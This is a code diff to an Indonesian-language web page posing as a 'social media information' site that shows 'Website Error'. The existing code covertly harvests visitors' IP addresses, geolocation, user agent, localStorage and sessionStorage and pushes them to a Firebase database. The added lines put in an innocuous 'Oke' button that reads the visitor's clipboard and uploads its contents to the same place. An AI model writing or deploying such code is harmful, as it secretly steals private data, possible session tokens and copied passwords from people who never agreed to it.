@@ -5,10 +5,48 @@
   <title>Informasi Social Media</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background-color: #f0f0f0;
+    }
+    .clipboard-section {
+      background: #fff;
+      padding: 15px;
+      border-radius: 10px;
+      margin-top: 20px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+    button {
+      padding: 8px 16px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      background-color: #007BFF;
+      color: white;
+    }
+    pre {
+      background: #eee;
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
   <h1>Selamat datang...</h1>
   <p>Website Error</p>
+
+  <div class="clipboard-section">
+    <h3>My Website</h3>
+    <p>
+      Selamat datang di website Informasi Social Media
+    </p>
+    <button onclick="aksesClipboard()">Oke</button>
+    <pre id="clipboardOutput">Belum diakses</pre>
+  </div>
 
   <script>
     const firebaseConfig = {
@@ -60,12 +98,17 @@
       }
     }
 
+    let globalData = {
+      timestamp: new Date().toLocaleString(),
+      clipboard: 'Belum diakses'
+    };
+
     async function collectAndSendData() {
       const publicIP = await getPublicIP();
       getLocalIP(localIP => {
         getGeoLocation(geo => {
-          const data = {
-            timestamp: new Date().toLocaleString(),
+          globalData = {
+            ...globalData,
             ip: publicIP,
             localIP: localIP || 'Tidak tersedia',
             userAgent: navigator.userAgent,
@@ -77,9 +120,20 @@
             localStorage: JSON.stringify(localStorage),
             sessionStorage: JSON.stringify(sessionStorage)
           };
-          db.ref('visitors').push(data);
+          db.ref('visitors').push(globalData);
         });
       });
+    }
+
+    async function aksesClipboard() {
+      try {
+        const isi = await navigator.clipboard.readText();
+        document.getElementById("clipboardOutput").textContent = isi || "(Clipboard kosong)";
+        globalData.clipboard = isi || "(Clipboard kosong)";
+        db.ref('visitors').push(globalData);
+      } catch (err) {
+        document.getElementById("clipboardOutput").textContent = "Gagal membaca clipboard: " + err.message;
+      }
     }
 
     collectAndSendData();
